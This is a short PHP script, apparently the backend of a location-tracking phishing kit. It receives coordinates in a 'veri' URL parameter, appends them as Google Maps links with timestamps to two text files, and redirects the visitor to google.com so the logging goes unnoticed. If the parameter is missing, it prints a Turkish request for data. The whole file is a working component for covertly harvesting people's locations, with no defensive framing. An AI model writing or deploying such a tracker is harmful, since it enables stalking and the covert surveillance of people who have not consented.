<?php 
date_default_timezone_set('Europe/Istanbul');
if (isset($_GET["veri"])) {

	$ac1 = fopen("../map.txt", "a+");
	$veri = ("https://www.google.com/maps/place/".$_GET["veri"]);
	fwrite($ac1, $veri);
	fclose($ac1);
	$ac = fopen("../old.txt", "a+");
	$veri = ("────".date('d.m.Y H:i:s')."────\nhttps://www.google.com/maps/place/".$_GET["veri"]."\n────────────────\n\n");
	fwrite($ac, $veri);
	fclose($ac);
	header("location: https://www.google.com");

?>
<?php	
header("Location: https://www.google.com/");
}
else{
	echo "Lütfen bir veri giriniz.";
}



 ?>